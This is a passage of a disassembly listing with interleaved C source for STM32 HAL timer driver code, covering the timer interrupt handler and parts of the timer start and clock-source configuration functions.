 8004f5e:	d001      	beq.n	8004f64 <HAL_TIM_Base_Start_IT+0x18>
  {
    return HAL_ERROR;
 8004f60:	2301      	movs	r3, #1
 8004f62:	e03b      	b.n	8004fdc <HAL_TIM_Base_Start_IT+0x90>
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004f64:	687b      	ldr	r3, [r7, #4]
 8004f66:	2202      	movs	r2, #2
 8004f68:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Enable the TIM Update interrupt */
  __HAL_TIM_ENABLE_IT(htim, TIM_IT_UPDATE);
 8004f6c:	687b      	ldr	r3, [r7, #4]
 8004f6e:	681b      	ldr	r3, [r3, #0]
 8004f70:	68da      	ldr	r2, [r3, #12]
 8004f72:	687b      	ldr	r3, [r7, #4]
 8004f74:	681b      	ldr	r3, [r3, #0]
 8004f76:	f042 0201 	orr.w	r2, r2, #1
 8004f7a:	60da      	str	r2, [r3, #12]

  /* Enable the Peripheral, except in trigger mode where enable is automatically done with trigger */
  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 8004f7c:	687b      	ldr	r3, [r7, #4]
 8004f7e:	681b      	ldr	r3, [r3, #0]
 8004f80:	4a19      	ldr	r2, [pc, #100]	; (8004fe8 <HAL_TIM_Base_Start_IT+0x9c>)
 8004f82:	4293      	cmp	r3, r2
 8004f84:	d009      	beq.n	8004f9a <HAL_TIM_Base_Start_IT+0x4e>
 8004f86:	687b      	ldr	r3, [r7, #4]
 8004f88:	681b      	ldr	r3, [r3, #0]
 8004f8a:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8004f8e:	d004      	beq.n	8004f9a <HAL_TIM_Base_Start_IT+0x4e>
 8004f90:	687b      	ldr	r3, [r7, #4]
 8004f92:	681b      	ldr	r3, [r3, #0]
 8004f94:	4a15      	ldr	r2, [pc, #84]	; (8004fec <HAL_TIM_Base_Start_IT+0xa0>)
 8004f96:	4293      	cmp	r3, r2
 8004f98:	d115      	bne.n	8004fc6 <HAL_TIM_Base_Start_IT+0x7a>
  {
    tmpsmcr = htim->Instance->SMCR & TIM_SMCR_SMS;
 8004f9a:	687b      	ldr	r3, [r7, #4]
 8004f9c:	681b      	ldr	r3, [r3, #0]
 8004f9e:	689a      	ldr	r2, [r3, #8]
 8004fa0:	4b13      	ldr	r3, [pc, #76]	; (8004ff0 <HAL_TIM_Base_Start_IT+0xa4>)
 8004fa2:	4013      	ands	r3, r2
 8004fa4:	60fb      	str	r3, [r7, #12]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004fa6:	68fb      	ldr	r3, [r7, #12]
 8004fa8:	2b06      	cmp	r3, #6
 8004faa:	d015      	beq.n	8004fd8 <HAL_TIM_Base_Start_IT+0x8c>
 8004fac:	68fb      	ldr	r3, [r7, #12]
 8004fae:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8004fb2:	d011      	beq.n	8004fd8 <HAL_TIM_Base_Start_IT+0x8c>
    {
      __HAL_TIM_ENABLE(htim);
 8004fb4:	687b      	ldr	r3, [r7, #4]
 8004fb6:	681b      	ldr	r3, [r3, #0]
 8004fb8:	681a      	ldr	r2, [r3, #0]
 8004fba:	687b      	ldr	r3, [r7, #4]
 8004fbc:	681b      	ldr	r3, [r3, #0]
 8004fbe:	f042 0201 	orr.w	r2, r2, #1
 8004fc2:	601a      	str	r2, [r3, #0]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004fc4:	e008      	b.n	8004fd8 <HAL_TIM_Base_Start_IT+0x8c>
    }
  }
  else
  {
    __HAL_TIM_ENABLE(htim);
 8004fc6:	687b      	ldr	r3, [r7, #4]
 8004fc8:	681b      	ldr	r3, [r3, #0]
 8004fca:	681a      	ldr	r2, [r3, #0]
 8004fcc:	687b      	ldr	r3, [r7, #4]
 8004fce:	681b      	ldr	r3, [r3, #0]
 8004fd0:	f042 0201 	orr.w	r2, r2, #1
 8004fd4:	601a      	str	r2, [r3, #0]
 8004fd6:	e000      	b.n	8004fda <HAL_TIM_Base_Start_IT+0x8e>
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004fd8:	bf00      	nop
  }

  /* Return function status */
  return HAL_OK;
 8004fda:	2300      	movs	r3, #0
}
 8004fdc:	4618      	mov	r0, r3
 8004fde:	3714      	adds	r7, #20
 8004fe0:	46bd      	mov	sp, r7
 8004fe2:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004fe6:	4770      	bx	lr
 8004fe8:	40012c00 	.word	0x40012c00
 8004fec:	40014000 	.word	0x40014000
 8004ff0:	00010007 	.word	0x00010007

08004ff4 <HAL_TIM_IRQHandler>:
  * @brief  This function handles TIM interrupts requests.
  * @param  htim TIM  handle
  * @retval None
  */
void HAL_TIM_IRQHandler(TIM_HandleTypeDef *htim)
{
 8004ff4:	b580      	push	{r7, lr}
 8004ff6:	b084      	sub	sp, #16
 8004ff8:	af00      	add	r7, sp, #0
 8004ffa:	6078      	str	r0, [r7, #4]
  uint32_t itsource = htim->Instance->DIER;
 8004ffc:	687b      	ldr	r3, [r7, #4]
 8004ffe:	681b      	ldr	r3, [r3, #0]
 8005000:	68db      	ldr	r3, [r3, #12]
 8005002:	60fb      	str	r3, [r7, #12]
  uint32_t itflag   = htim->Instance->SR;
 8005004:	687b      	ldr	r3, [r7, #4]
 8005006:	681b      	ldr	r3, [r3, #0]
 8005008:	691b      	ldr	r3, [r3, #16]
 800500a:	60bb      	str	r3, [r7, #8]

  /* Capture compare 1 event */
  if ((itflag & (TIM_FLAG_CC1)) == (TIM_FLAG_CC1))
 800500c:	68bb      	ldr	r3, [r7, #8]
 800500e:	f003 0302 	and.w	r3, r3, #2
 8005012:	2b00      	cmp	r3, #0
 8005014:	d020      	beq.n	8005058 <HAL_TIM_IRQHandler+0x64>
  {
    if ((itsource & (TIM_IT_CC1)) == (TIM_IT_CC1))
 8005016:	68fb      	ldr	r3, [r7, #12]
 8005018:	f003 0302 	and.w	r3, r3, #2
 800501c:	2b00      	cmp	r3, #0
 800501e:	d01b      	beq.n	8005058 <HAL_TIM_IRQHandler+0x64>
    {
      {
        __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC1);
 8005020:	687b      	ldr	r3, [r7, #4]
 8005022:	681b      	ldr	r3, [r3, #0]
 8005024:	f06f 0202 	mvn.w	r2, #2
 8005028:	611a      	str	r2, [r3, #16]
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_1;
 800502a:	687b      	ldr	r3, [r7, #4]
 800502c:	2201      	movs	r2, #1
 800502e:	771a      	strb	r2, [r3, #28]

        /* Input capture event */
        if ((htim->Instance->CCMR1 & TIM_CCMR1_CC1S) != 0x00U)
 8005030:	687b      	ldr	r3, [r7, #4]
 8005032:	681b      	ldr	r3, [r3, #0]
 8005034:	699b      	ldr	r3, [r3, #24]
 8005036:	f003 0303 	and.w	r3, r3, #3
 800503a:	2b00      	cmp	r3, #0
 800503c:	d003      	beq.n	8005046 <HAL_TIM_IRQHandler+0x52>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->IC_CaptureCallback(htim);
#else
          HAL_TIM_IC_CaptureCallback(htim);
 800503e:	6878      	ldr	r0, [r7, #4]
 8005040:	f000 f9ad 	bl	800539e <HAL_TIM_IC_CaptureCallback>
 8005044:	e005      	b.n	8005052 <HAL_TIM_IRQHandler+0x5e>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->OC_DelayElapsedCallback(htim);
          htim->PWM_PulseFinishedCallback(htim);
#else
          HAL_TIM_OC_DelayElapsedCallback(htim);
 8005046:	6878      	ldr	r0, [r7, #4]
 8005048:	f000 f99f 	bl	800538a <HAL_TIM_OC_DelayElapsedCallback>
          HAL_TIM_PWM_PulseFinishedCallback(htim);
 800504c:	6878      	ldr	r0, [r7, #4]
 800504e:	f000 f9b0 	bl	80053b2 <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
        }
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8005052:	687b      	ldr	r3, [r7, #4]
 8005054:	2200      	movs	r2, #0
 8005056:	771a      	strb	r2, [r3, #28]
      }
    }
  }
  /* Capture compare 2 event */
  if ((itflag & (TIM_FLAG_CC2)) == (TIM_FLAG_CC2))
 8005058:	68bb      	ldr	r3, [r7, #8]
 800505a:	f003 0304 	and.w	r3, r3, #4
 800505e:	2b00      	cmp	r3, #0
 8005060:	d020      	beq.n	80050a4 <HAL_TIM_IRQHandler+0xb0>
  {
    if ((itsource & (TIM_IT_CC2)) == (TIM_IT_CC2))
 8005062:	68fb      	ldr	r3, [r7, #12]
 8005064:	f003 0304 	and.w	r3, r3, #4
 8005068:	2b00      	cmp	r3, #0
 800506a:	d01b      	beq.n	80050a4 <HAL_TIM_IRQHandler+0xb0>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC2);
 800506c:	687b      	ldr	r3, [r7, #4]
 800506e:	681b      	ldr	r3, [r3, #0]
 8005070:	f06f 0204 	mvn.w	r2, #4
 8005074:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_2;
 8005076:	687b      	ldr	r3, [r7, #4]
 8005078:	2202      	movs	r2, #2
 800507a:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR1 & TIM_CCMR1_CC2S) != 0x00U)
 800507c:	687b      	ldr	r3, [r7, #4]
 800507e:	681b      	ldr	r3, [r3, #0]
 8005080:	699b      	ldr	r3, [r3, #24]
 8005082:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8005086:	2b00      	cmp	r3, #0
 8005088:	d003      	beq.n	8005092 <HAL_TIM_IRQHandler+0x9e>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 800508a:	6878      	ldr	r0, [r7, #4]
 800508c:	f000 f987 	bl	800539e <HAL_TIM_IC_CaptureCallback>
 8005090:	e005      	b.n	800509e <HAL_TIM_IRQHandler+0xaa>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8005092:	6878      	ldr	r0, [r7, #4]
 8005094:	f000 f979 	bl	800538a <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8005098:	6878      	ldr	r0, [r7, #4]
 800509a:	f000 f98a 	bl	80053b2 <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 800509e:	687b      	ldr	r3, [r7, #4]
 80050a0:	2200      	movs	r2, #0
 80050a2:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 3 event */
  if ((itflag & (TIM_FLAG_CC3)) == (TIM_FLAG_CC3))
 80050a4:	68bb      	ldr	r3, [r7, #8]
 80050a6:	f003 0308 	and.w	r3, r3, #8
 80050aa:	2b00      	cmp	r3, #0
 80050ac:	d020      	beq.n	80050f0 <HAL_TIM_IRQHandler+0xfc>
  {
    if ((itsource & (TIM_IT_CC3)) == (TIM_IT_CC3))
 80050ae:	68fb      	ldr	r3, [r7, #12]
 80050b0:	f003 0308 	and.w	r3, r3, #8
 80050b4:	2b00      	cmp	r3, #0
 80050b6:	d01b      	beq.n	80050f0 <HAL_TIM_IRQHandler+0xfc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC3);
 80050b8:	687b      	ldr	r3, [r7, #4]
 80050ba:	681b      	ldr	r3, [r3, #0]
 80050bc:	f06f 0208 	mvn.w	r2, #8
 80050c0:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_3;
 80050c2:	687b      	ldr	r3, [r7, #4]
 80050c4:	2204      	movs	r2, #4
 80050c6:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC3S) != 0x00U)
 80050c8:	687b      	ldr	r3, [r7, #4]
 80050ca:	681b      	ldr	r3, [r3, #0]
 80050cc:	69db      	ldr	r3, [r3, #28]
 80050ce:	f003 0303 	and.w	r3, r3, #3
 80050d2:	2b00      	cmp	r3, #0
 80050d4:	d003      	beq.n	80050de <HAL_TIM_IRQHandler+0xea>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 80050d6:	6878      	ldr	r0, [r7, #4]
 80050d8:	f000 f961 	bl	800539e <HAL_TIM_IC_CaptureCallback>
 80050dc:	e005      	b.n	80050ea <HAL_TIM_IRQHandler+0xf6>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 80050de:	6878      	ldr	r0, [r7, #4]
 80050e0:	f000 f953 	bl	800538a <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 80050e4:	6878      	ldr	r0, [r7, #4]
 80050e6:	f000 f964 	bl	80053b2 <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 80050ea:	687b      	ldr	r3, [r7, #4]
 80050ec:	2200      	movs	r2, #0
 80050ee:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 4 event */
  if ((itflag & (TIM_FLAG_CC4)) == (TIM_FLAG_CC4))
 80050f0:	68bb      	ldr	r3, [r7, #8]
 80050f2:	f003 0310 	and.w	r3, r3, #16
 80050f6:	2b00      	cmp	r3, #0
 80050f8:	d020      	beq.n	800513c <HAL_TIM_IRQHandler+0x148>
  {
    if ((itsource & (TIM_IT_CC4)) == (TIM_IT_CC4))
 80050fa:	68fb      	ldr	r3, [r7, #12]
 80050fc:	f003 0310 	and.w	r3, r3, #16
 8005100:	2b00      	cmp	r3, #0
 8005102:	d01b      	beq.n	800513c <HAL_TIM_IRQHandler+0x148>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC4);
 8005104:	687b      	ldr	r3, [r7, #4]
 8005106:	681b      	ldr	r3, [r3, #0]
 8005108:	f06f 0210 	mvn.w	r2, #16
 800510c:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_4;
 800510e:	687b      	ldr	r3, [r7, #4]
 8005110:	2208      	movs	r2, #8
 8005112:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC4S) != 0x00U)
 8005114:	687b      	ldr	r3, [r7, #4]
 8005116:	681b      	ldr	r3, [r3, #0]
 8005118:	69db      	ldr	r3, [r3, #28]
 800511a:	f403 7340 	and.w	r3, r3, #768	; 0x300
 800511e:	2b00      	cmp	r3, #0
 8005120:	d003      	beq.n	800512a <HAL_TIM_IRQHandler+0x136>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8005122:	6878      	ldr	r0, [r7, #4]
 8005124:	f000 f93b 	bl	800539e <HAL_TIM_IC_CaptureCallback>
 8005128:	e005      	b.n	8005136 <HAL_TIM_IRQHandler+0x142>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 800512a:	6878      	ldr	r0, [r7, #4]
 800512c:	f000 f92d 	bl	800538a <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8005130:	6878      	ldr	r0, [r7, #4]
 8005132:	f000 f93e 	bl	80053b2 <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8005136:	687b      	ldr	r3, [r7, #4]
 8005138:	2200      	movs	r2, #0
 800513a:	771a      	strb	r2, [r3, #28]
    }
  }
  /* TIM Update event */
  if ((itflag & (TIM_FLAG_UPDATE)) == (TIM_FLAG_UPDATE))
 800513c:	68bb      	ldr	r3, [r7, #8]
 800513e:	f003 0301 	and.w	r3, r3, #1
 8005142:	2b00      	cmp	r3, #0
 8005144:	d00c      	beq.n	8005160 <HAL_TIM_IRQHandler+0x16c>
  {
    if ((itsource & (TIM_IT_UPDATE)) == (TIM_IT_UPDATE))
 8005146:	68fb      	ldr	r3, [r7, #12]
 8005148:	f003 0301 	and.w	r3, r3, #1
 800514c:	2b00      	cmp	r3, #0
 800514e:	d007      	beq.n	8005160 <HAL_TIM_IRQHandler+0x16c>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_UPDATE);
 8005150:	687b      	ldr	r3, [r7, #4]
 8005152:	681b      	ldr	r3, [r3, #0]
 8005154:	f06f 0201 	mvn.w	r2, #1
 8005158:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->PeriodElapsedCallback(htim);
#else
      HAL_TIM_PeriodElapsedCallback(htim);
 800515a:	6878      	ldr	r0, [r7, #4]
 800515c:	f7fb fe64 	bl	8000e28 <HAL_TIM_PeriodElapsedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break input event */
  if ((itflag & (TIM_FLAG_BREAK)) == (TIM_FLAG_BREAK))
 8005160:	68bb      	ldr	r3, [r7, #8]
 8005162:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8005166:	2b00      	cmp	r3, #0
 8005168:	d00c      	beq.n	8005184 <HAL_TIM_IRQHandler+0x190>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 800516a:	68fb      	ldr	r3, [r7, #12]
 800516c:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8005170:	2b00      	cmp	r3, #0
 8005172:	d007      	beq.n	8005184 <HAL_TIM_IRQHandler+0x190>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_BREAK);
 8005174:	687b      	ldr	r3, [r7, #4]
 8005176:	681b      	ldr	r3, [r3, #0]
 8005178:	f06f 0280 	mvn.w	r2, #128	; 0x80
 800517c:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->BreakCallback(htim);
#else
      HAL_TIMEx_BreakCallback(htim);
 800517e:	6878      	ldr	r0, [r7, #4]
 8005180:	f000 fa9a 	bl	80056b8 <HAL_TIMEx_BreakCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break2 input event */
  if ((itflag & (TIM_FLAG_BREAK2)) == (TIM_FLAG_BREAK2))
 8005184:	68bb      	ldr	r3, [r7, #8]
 8005186:	f403 7380 	and.w	r3, r3, #256	; 0x100
 800518a:	2b00      	cmp	r3, #0
 800518c:	d00c      	beq.n	80051a8 <HAL_TIM_IRQHandler+0x1b4>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 800518e:	68fb      	ldr	r3, [r7, #12]
 8005190:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8005194:	2b00      	cmp	r3, #0
 8005196:	d007      	beq.n	80051a8 <HAL_TIM_IRQHandler+0x1b4>
    {
      __HAL_TIM_CLEAR_FLAG(htim, TIM_FLAG_BREAK2);
 8005198:	687b      	ldr	r3, [r7, #4]
 800519a:	681b      	ldr	r3, [r3, #0]
 800519c:	f46f 7280 	mvn.w	r2, #256	; 0x100
 80051a0:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->Break2Callback(htim);
#else
      HAL_TIMEx_Break2Callback(htim);
 80051a2:	6878      	ldr	r0, [r7, #4]
 80051a4:	f000 fa92 	bl	80056cc <HAL_TIMEx_Break2Callback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Trigger detection event */
  if ((itflag & (TIM_FLAG_TRIGGER)) == (TIM_FLAG_TRIGGER))
 80051a8:	68bb      	ldr	r3, [r7, #8]
 80051aa:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80051ae:	2b00      	cmp	r3, #0
 80051b0:	d00c      	beq.n	80051cc <HAL_TIM_IRQHandler+0x1d8>
  {
    if ((itsource & (TIM_IT_TRIGGER)) == (TIM_IT_TRIGGER))
 80051b2:	68fb      	ldr	r3, [r7, #12]
 80051b4:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80051b8:	2b00      	cmp	r3, #0
 80051ba:	d007      	beq.n	80051cc <HAL_TIM_IRQHandler+0x1d8>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_TRIGGER);
 80051bc:	687b      	ldr	r3, [r7, #4]
 80051be:	681b      	ldr	r3, [r3, #0]
 80051c0:	f06f 0240 	mvn.w	r2, #64	; 0x40
 80051c4:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->TriggerCallback(htim);
#else
      HAL_TIM_TriggerCallback(htim);
 80051c6:	6878      	ldr	r0, [r7, #4]
 80051c8:	f000 f8fd 	bl	80053c6 <HAL_TIM_TriggerCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM commutation event */
  if ((itflag & (TIM_FLAG_COM)) == (TIM_FLAG_COM))
 80051cc:	68bb      	ldr	r3, [r7, #8]
 80051ce:	f003 0320 	and.w	r3, r3, #32
 80051d2:	2b00      	cmp	r3, #0
 80051d4:	d00c      	beq.n	80051f0 <HAL_TIM_IRQHandler+0x1fc>
  {
    if ((itsource & (TIM_IT_COM)) == (TIM_IT_COM))
 80051d6:	68fb      	ldr	r3, [r7, #12]
 80051d8:	f003 0320 	and.w	r3, r3, #32
 80051dc:	2b00      	cmp	r3, #0
 80051de:	d007      	beq.n	80051f0 <HAL_TIM_IRQHandler+0x1fc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_FLAG_COM);
 80051e0:	687b      	ldr	r3, [r7, #4]
 80051e2:	681b      	ldr	r3, [r3, #0]
 80051e4:	f06f 0220 	mvn.w	r2, #32
 80051e8:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->CommutationCallback(htim);
#else
      HAL_TIMEx_CommutCallback(htim);
 80051ea:	6878      	ldr	r0, [r7, #4]
 80051ec:	f000 fa5a 	bl	80056a4 <HAL_TIMEx_CommutCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
}
 80051f0:	bf00      	nop
 80051f2:	3710      	adds	r7, #16
 80051f4:	46bd      	mov	sp, r7
 80051f6:	bd80      	pop	{r7, pc}

080051f8 <HAL_TIM_ConfigClockSource>:
  * @param  sClockSourceConfig pointer to a TIM_ClockConfigTypeDef structure that
  *         contains the clock source information for the TIM peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_ConfigClockSource(TIM_HandleTypeDef *htim, const TIM_ClockConfigTypeDef *sClockSourceConfig)
{
 80051f8:	b580      	push	{r7, lr}
 80051fa:	b084      	sub	sp, #16
 80051fc:	af00      	add	r7, sp, #0
 80051fe:	6078      	str	r0, [r7, #4]
 8005200:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status = HAL_OK;
 8005202:	2300      	movs	r3, #0
 8005204:	73fb      	strb	r3, [r7, #15]
  uint32_t tmpsmcr;

  /* Process Locked */
  __HAL_LOCK(htim);
 8005206:	687b      	ldr	r3, [r7, #4]
 8005208:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 800520c:	2b01      	cmp	r3, #1
 800520e:	d101      	bne.n	8005214 <HAL_TIM_ConfigClockSource+0x1c>
 8005210:	2302      	movs	r3, #2
 8005212:	e0b6      	b.n	8005382 <HAL_TIM_ConfigClockSource+0x18a>
 8005214:	687b      	ldr	r3, [r7, #4]
 8005216:	2201      	movs	r2, #1
 8005218:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  htim->State = HAL_TIM_STATE_BUSY;
 800521c:	687b      	ldr	r3, [r7, #4]
 800521e:	2202      	movs	r2, #2
 8005220:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Check the parameters */
  assert_param(IS_TIM_CLOCKSOURCE(sClockSourceConfig->ClockSource));

  /* Reset the SMS, TS, ECE, ETPS and ETRF bits */
  tmpsmcr = htim->Instance->SMCR;
 8005224:	687b      	ldr	r3, [r7, #4]
 8005226:	681b      	ldr	r3, [r3, #0]
 8005228:	689b      	ldr	r3, [r3, #8]
 800522a:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_SMS | TIM_SMCR_TS);
 800522c:	68bb      	ldr	r3, [r7, #8]
 800522e:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8005232:	f023 0377 	bic.w	r3, r3, #119	; 0x77
 8005236:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 8005238:	68bb      	ldr	r3, [r7, #8]
 800523a:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 800523e:	60bb      	str	r3, [r7, #8]
  htim->Instance->SMCR = tmpsmcr;
 8005240:	687b      	ldr	r3, [r7, #4]
 8005242:	681b      	ldr	r3, [r3, #0]
 8005244:	68ba      	ldr	r2, [r7, #8]
 8005246:	609a      	str	r2, [r3, #8]

  switch (sClockSourceConfig->ClockSource)
 8005248:	683b      	ldr	r3, [r7, #0]
 800524a:	681b      	ldr	r3, [r3, #0]
 800524c:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 8005250:	d03e      	beq.n	80052d0 <HAL_TIM_ConfigClockSource+0xd8>
 8005252:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 8005256:	f200 8087 	bhi.w	8005368 <HAL_TIM_ConfigClockSource+0x170>
 800525a:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800525e:	f000 8086 	beq.w	800536e <HAL_TIM_ConfigClockSource+0x176>
 8005262:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 8005266:	d87f      	bhi.n	8005368 <HAL_TIM_ConfigClockSource+0x170>
 8005268:	2b70      	cmp	r3, #112	; 0x70
 800526a:	d01a      	beq.n	80052a2 <HAL_TIM_ConfigClockSource+0xaa>
 800526c:	2b70      	cmp	r3, #112	; 0x70
 800526e:	d87b      	bhi.n	8005368 <HAL_TIM_ConfigClockSource+0x170>
 8005270:	2b60      	cmp	r3, #96	; 0x60
 8005272:	d050      	beq.n	8005316 <HAL_TIM_ConfigClockSource+0x11e>
 8005274:	2b60      	cmp	r3, #96	; 0x60
 8005276:	d877      	bhi.n	8005368 <HAL_TIM_ConfigClockSource+0x170>
 8005278:	2b50      	cmp	r3, #80	; 0x50
 800527a:	d03c      	beq.n	80052f6 <HAL_TIM_ConfigClockSource+0xfe>
 800527c:	2b50      	cmp	r3, #80	; 0x50
 800527e:	d873      	bhi.n	8005368 <HAL_TIM_ConfigClockSource+0x170>
 8005280:	2b40      	cmp	r3, #64	; 0x40
 8005282:	d058      	beq.n	8005336 <HAL_TIM_ConfigClockSource+0x13e>
 8005284:	2b40      	cmp	r3, #64	; 0x40
 8005286:	d86f      	bhi.n	8005368 <HAL_TIM_ConfigClockSource+0x170>
 8005288:	2b30      	cmp	r3, #48	; 0x30
 800528a:	d064      	beq.n	8005356 <HAL_TIM_ConfigClockSource+0x15e>
 800528c:	2b30      	cmp	r3, #48	; 0x30
 800528e:	d86b      	bhi.n	8005368 <HAL_TIM_ConfigClockSource+0x170>
 8005290:	2b20      	cmp	r3, #32
 8005292:	d060      	beq.n	8005356 <HAL_TIM_ConfigClockSource+0x15e>
 8005294:	2b20      	cmp	r3, #32
 8005296:	d867      	bhi.n	8005368 <HAL_TIM_ConfigClockSource+0x170>
 8005298:	2b00      	cmp	r3, #0
 800529a:	d05c      	beq.n	8005356 <HAL_TIM_ConfigClockSource+0x15e>
 800529c:	2b10      	cmp	r3, #16
 800529e:	d05a      	beq.n	8005356 <HAL_TIM_ConfigClockSource+0x15e>
 80052a0:	e062      	b.n	8005368 <HAL_TIM_ConfigClockSource+0x170>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 80052a2:	687b      	ldr	r3, [r7, #4]
 80052a4:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 80052a6:	683b      	ldr	r3, [r7, #0]
 80052a8:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 80052aa:	683b      	ldr	r3, [r7, #0]
 80052ac:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 80052ae:	683b      	ldr	r3, [r7, #0]
 80052b0:	68db      	ldr	r3, [r3, #12]
